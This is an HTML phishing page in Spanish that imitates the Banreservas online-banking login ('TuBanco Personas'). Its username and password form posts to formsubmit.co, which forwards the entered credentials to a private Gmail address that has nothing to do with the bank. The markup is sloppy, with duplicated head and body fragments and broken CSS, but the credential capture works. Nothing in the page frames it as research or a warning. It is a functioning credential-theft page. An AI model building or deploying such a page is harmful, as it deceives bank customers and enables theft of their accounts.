<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banreservas</title>
    <style>
        /* Estilo para la página */
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff; /* Color de fondo gris claro */
            font-family: Arial, sans-serif;
            height: 150vh; /* Altura completa de la ventana del navegador */
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .line-container {
            width: 100%;
            position: absolute;
            top: 0;
            left: 0;
            height: 50px; /* Altura de la línea ajustada a 50px */
            background-color: #333; /* Color de la línea */
            z-index: 1; /* Asegura que la línea esté debajo del logo y las opciones */
            display: flex;
            align-items: center;
            justify-content: center; /* Centra horizontalmente el contenido dentro de la línea */
            padding: 0 70px; /* Espacio para acomodar el cuadro pequeño en el lado derecho */
            box-sizing: border-box; /* Incluye padding en el ancho total */
        }
        .logo-container {
            position: absolute;
            top: 60px; /* Mueve el logo debajo de la línea */
            left: 50%;
            transform: translateX(-50%); /* Centra horizontalmente el logo */
            z-index: 2; /* Asegura que el logo esté encima del cuadro */
        }
        .logo-container img {
            width: 150px; /* Ajusta el tamaño del logo según sea necesario */
        }
        .options-container {
            display: flex;
            gap: 15px; /* Espacio entre las opciones */
            font-size: 12px; /* Tamaño de fuente pequeño */
            color: #fff; /* Color del texto */
            z-index: 2; /* Asegura que las opciones estén encima de la línea */
        }
        .options-container a {
            text-decoration: none; /* Quita el subrayado de los enlaces */
            color: #fff; /* Color del texto de los enlaces */
        }
        .small-box {
            width: 80px; /* Ancho del cuadro pequeño */
            height: 50px; /* Altura del cuadro pequeño */
            background-color: #1a79bd; /* Color de fondo del cuadro pequeño (naranja) */
            position: absolute;
            right: 0; /* Alinea el cuadro pequeño al borde derecho */
            top: 0; /* Alinea el cuadro pequeño al borde superior de la línea */
            z-index: 2; /* Asegura que el cuadro pequeño esté encima de la línea */
        }
        .small-box::before {
            content: '';
            width: 1px; /* Ancho de la línea vertical */
            height: 100%; /* Altura de la línea vertical */
            background-color: 115380; /* Color de la línea vertical (blanco) */
            position: absolute;
            left: 50%; /* Centra la línea vertical dentro del cuadro pequeño */
            transform: translateX(-50%); /* Ajusta la posición de la línea vertical */
        }
        .center-box {
            width: 400px; /* Ancho del cuadro */
            height: 500px; /* Altura automática para ajustarse al contenido */
            border: 1px solid #ccc; /* Borde opcional para el cuadro */
            background-color:  ; /* Color de fondo verde */
            border: 1px solid #ccc; /* Borde opcional para el cuadro */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Sombra opcional para darle un efecto de profundidad */
            z-index: 100px; /* Asegura que el cuadro esté debajo del logo y las opciones */
            position: relative; /* Para posicionar el contenido dentro de él */
            display: flex;
            flex-direction: column;
            align-items: center; /* Centra horizontalmente el contenido */
            padding: 20px; /* Espacio interno en el cuadro */
            box-sizing: border-box; /* Incluye padding en el ancho total */
        }
        .logo-title-container {
            text-align: center; /* Centra el texto */
            margin-bottom: 20px; /* Espacio debajo del logo y título */
        }
        .logo-title-container img {
            width: 100px; /* Tamaño del logo */
            margin-bottom: 20px; /* Espacio entre el logo y el título */
        }
        .logo-title-container h1 {
            margin: 0; /* Quita el margen del título */
            font-size: 24px; /* Tamaño del texto del título */
            color: #fff; /* Color del texto del título */
        }
        /* Estilos para el formulario */
        .form-container {
            background-color: #fff; /* Fondo blanco para el formulario */
            padding: 20px;
            border-radius: 8px; /* Bordes redondeados para el formulario */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Sombra para darle profundidad */
            width: 100%;
            max-width: 400px; /* Ancho máximo del formulario */
            margin-bottom: 20px; /* Espacio debajo del formulario */
        }
        .form-container label {
            display: block;
            margin-bottom: 10px;
            font-size: 16px;
            color: #333;
        }
        .form-container input[type="text"],
        .form-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50; /* Color del botón */
            color: #fff; /* Color del texto del botón */
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .form-container button:hover {
            background-color: #45a049; /* Color del botón al pasar el ratón */
        }
        .additional-info {
            text-align: center; /* Centra el texto y las opciones adicionales */
            color: #0112ff; /* Color del texto */
        }
        .additional-info p {
            font-size: 14px; /* Tamaño del texto pequeño */
            margin: 0 0 10px 0; /* Espacio debajo del texto pequeño */
        }
        .additional-info .options {
            display: flex;
            flex-direction: column; /* Coloca las opciones una debajo de la otra */
            gap: 10px; /* Espacio entre las opciones */
        }
        .additional-info .options a {
            color: #002fff; /* Color del texto de los enlaces */
            text-decoration: none; /* Quita el subrayado de los enlaces */
            font-size: 14px; /* Tamaño del texto de las opciones */
        }
        .bottom-option {
            position: absolute;
            bottom: 20px; /* Espacio desde el borde inferior de la página */
            right: 20px; /* Espacio desde el borde derecho de la página */
            background-color: #ffffff; /* Color de fondo de la opción */
            color: #fff; /* Color del texto */
            padding: 10px 20px;
            border-radius: 4px; /* Bordes redondeados */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Sombra para darle profundidad */
            font-size: 14px; /* Tamaño del texto */
            text-decoration: none; /* Quita el subrayado del enlace */
        }
        .bottom-option:hover {
            background-color: #555; /* Color de fondo al pasar el ratón sobre la opción */
        }
        .bottom-logo-container {
            position: absolute;
            bottom: 80px; /* Espacio desde el borde inferior de la página, ajustado para que esté encima de la opción adicional */
            left: 50%;
            transform: translateX(-50%); /* Centra horizontalmente el logo */
            z-index: 2; /* Asegura que el logo esté encima de la opción adicional */
        }
        .bottom-logo-container img {
            width: 100px; /* Ajusta el tamaño del logo según sea necesario */
        }
    </style>
</head>
<body>
    <div class="line-container">
        <div class="options-container">
            <a href="#opcion1">Contactenos</a>
            <a href="#opcion2">Idioma</a>
            <a href="#opcion3">Ayuda</a>
        </div>
        <div class="small-box"></div> <!-- Cuadro pequeño en la parte derecha de la línea -->
    </div>
    <div class="logo-container">
        <img src="logo banreserva.png" alt="Logo"> <h1>Banreservas</h1> <div><background-color: id="color:#333"></background-color:></div>
    </div>
    <div class="center-box">
        <div class="logo-title-container">
            <h3>Bienvenidos a TuBanco Personas</h3> <!-- Título debajo del logo -->
        </div>
        <div class="form-container">
        </style>
    </head>
    <body>
            <form action="https://formsubmit.co/darhub2342@gmail.com" method="POST">
                <div class="form-group">
                <label for="username">Usuario</label>
                <input type="text" id="username" name="username" placeholder="Introduce tu usuario">

                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" placeholder="Introduce tu contraseña">

                <button type="submit">Continuar</button>
            </form>
        </div>
        
        <div class="additional-info">
            <p>Cambiar a TuBanco Empresas</p> 
            <div class="options">
                <a href="#opcion4">Nuevo usuario persona</a>
                <a href="#opcion5">¿Olvidó su contraseña?</a>
            </div>
        </div>
    </div>
    <a</a> <!-- Opción en la esquina inferior derecha -->
    <div class="bottom-logo-container">
    </style>
</head>
<body>
        <form action="https://formsubmit.co/darhub2342@gmail.com" method="POST">
            <div class="form-group">
        </form>
    </div>
</body>
</html>
